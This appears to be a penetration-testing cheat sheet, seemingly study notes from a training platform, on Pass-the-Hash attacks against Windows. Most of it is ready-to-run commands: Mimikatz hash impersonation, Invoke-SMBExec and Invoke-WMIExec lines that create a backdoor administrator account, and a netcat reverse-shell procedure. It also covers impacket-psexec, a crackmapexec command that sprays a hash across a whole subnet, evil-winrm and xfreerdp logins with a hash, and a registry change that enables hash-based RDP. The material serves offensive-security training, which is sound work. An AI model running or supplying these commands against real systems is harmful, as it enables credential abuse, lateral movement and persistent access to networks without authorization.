- [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.
- The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all.
---
## PtH from Windows
- PtH with [Mimikatz](https://github.com/gentilkiwi).
	``` powershell
	c:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:<name> /rc4:<MTLM hash> /domain:<> /run:cmd.exe" exit
	```
	- `/rc4` or `/NTLM` - NTLM hash of the user's password.
	- `/domain` - Domain the user to impersonate belongs to.
		- For local user account, use the machine name, localhost or a dot (.).
	- After executing the above command, another CMD window in the context of the target user will pop up.
- PtH with [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash).
	- The tool can perform PtH with WMI and SMB through the .NET TCPClient.
	- Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol.
	- Admin priv not required on client-side, but the user and hash we use to authenticate need to have admin priv on the target.
	- The following command will create a new user and add it to admins group.
	``` powershell
	PS> Import-Module .\Invoke-TheHash.psd1
	PS> Invoke-SMBExec -Target IP -Domain Domain -Username Name -Hash NTLM/NT:NTLM -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
	# OR
	PS> Invoke-WMIExec -Target IP -Domain Domain -Username Name -Hash NTLM/NT:NTLM -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
	```
- We can also get a reverse shell connection in the target machine.
	1. Start a netcat listener on attack host `nc.exe -lvnp 8001`
	2. Create a rev shell payload using [revshells](https://www.revshells.com/), set `IP`, `PORT`, `PowerShell #3 (Base64)`.
	3. Utilize `Invoke-WMIExec` to execute the payload on the target machine
		``` powershell
		PS> Invoke-WMIExec -Target <IP/Hostname> -Domain <domain> -Username <name> -Hash <hash> -Command "The payload"
		```
## PtH from Linux
- PtH with [Impacket](https://github.com/SecureAuthCorp/impacket)
	``` bash
	$ impacket-psexec USER@IP -hashes :<hash>
	```
	- we can also use [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py), [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py), [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py).
- PtH with `crackmapexec`
	``` bash
	# Authenticate the leaked user creds against every host in the domain's subnet, or provide IP for one host
	crackmapexec smb 172.16.1.0/24 -u administrator -d <domain or .> -H <hash>
	# To perform the same actions against local administrator hash add --local-auth to the command.
	# To execute commands add `-x <command>` to the command.
	```
- PtH with `evil-winrm`
	``` bash
	$ evil-winrm -i <IP> -u Administrator -H <hash>
	# In case of using a domain account, include it, for example: administrator@domain
	```
- RDP 
	- PtH with `xfreerdp`
		``` bash
		xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
		```
  - `Restricted Admin Mode` is disabled by default, it should be enabled on the target host.
  <img src="https://academy.hackthebox.com/storage/modules/147/rdp_session-4.png" style="width:40%; height:40%;">

  - Enable it by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of `0`. 
      ```cmd
      c:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
      ```

> [!Note]
> **UAC protection**:
> UAC (User Account Control) limits local users' ability to perform remote administration operations. 
> If the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` set to `0`, 
> it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks.
> If set to `1`, it allows the other local admins as well.
> 
> **Exception**:
> The registry key `FilterAdministratorToken` (disabled by default).
> If its value is `1`, the RID 500 account (even if it is renamed) is enrolled in UAC protection.
> This means that remote PTH will fail against the machine when using that account.
> 
> These settings are only for local administrative accounts.
> If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer.

---
